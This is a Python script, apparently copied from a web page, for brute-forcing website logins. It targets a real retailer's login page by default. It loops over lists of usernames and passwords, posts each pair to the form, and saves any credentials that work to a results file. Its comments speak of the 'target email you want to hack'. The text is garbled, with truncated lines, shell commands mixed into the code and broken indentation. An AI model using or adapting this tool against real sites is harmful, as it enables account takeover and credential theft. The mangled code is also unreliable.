import requests
from sys import exit
url = 'https://www.swatch.com/choose/login.php' userField = 'email'
passwordField = 'pass'
cd C: / path/to/Brute-Force-Login
python main.py


def open_ressources(file_path):


return [item.replace("\n", "") for item in open(file_path).readlines()]
INCORRECT_MESSAGE = open_ressources('./ressources/incorrectMessage.txt') SUCCESS_MESSAGE = open_ressources('./ressources/successMessage.txt') PASSWORDS = open_ressources('./ressources/passwords.txt')
USERS = open_ressources('./ressources/users.txt') LIMIT_TRYING_ACCESSING_URL = 7


def process_request(request, user, password, failed_aftertry, user_field, p """[summary]
Arguments:
request {[type]} -- [description]
user {[type]} -- [description]
password {[type]} -- [description] failed_aftertry {[type]} -- [description] user_field {[type]} -- [description] password_field {[type]} -- [description]

if "404" in request.text or "404 - Not Found" in request.text or reques
if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
print ("[+] Connection failed : Trying again ....") return
else:
failed_aftertry = failed_aftertry+1
print ("[+] Connection failed : 404 Not Found (Verify your url)
else:
# if you want to see the text result remove the comment here #print data.text
if INCORRECT_MESSAGE[0] in request.text or INCORRECT_MESSAGE[1] in
            print ("[+] Failed to connect with:\n user: "+user+" and passwo
        else:
if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[1] in result = "\n----------------------------------------------- result += "\\OK!! \nTheese Credentials succeed:\n> user: "+ result += "------------------------------------------------ with open("./results.txt", "w+") as frr:
frr.write(result)
print("[+] A Match succeed 'user: "+user+" and password: "+ return
            else:
                print ("Trying theese parameters: user: "+user+" and passwo
def process_user(user, url, failed_aftertry, user_field, password_field): """[summary]

Arguments:
user {[type]} - - [description]
url {[type]} - - [description] failed_aftertry {[type]} - - [description] user_field {[type]} - - [description] password_field {[type]} - - [description]
    """
    for password in PASSWORDS:
dados = {user_field: user.replace(
    '\n', ''), password_field: password.replace('\n', '')}
print ("[+]", dados)
# Doing the post form
request = requests.post(url, data=dados)
process_request(request, user, password, failed_aftertry, user_fiel
def try_connection(url, user_field, password_field): """[summary]
Arguments:
url {[type]} - - [description]
user_field {[type]} - - [description] password_field {[type]} - - [description]
"""
print ("[+] Connecting to: "+url+"......\n")
# Put the target email you want to hack
# user_email = raw_input("\nEnter EMAIL / USERNAME of the account you wa failed_aftertry = 0
for user in USERS:
process_user(user, url, failed_aftertry, user_field, password_field
def manual_mode(): """[summary]
"""
print("[+] Manual mode selected ")
print("[+] After inspecting the LOGIN <form />, please fill here :")
# Field's Form -------
# The link of the website
url = input("\n[+] Enter the target URL (it's the 'action' attribute on # The user_field in the form of the login
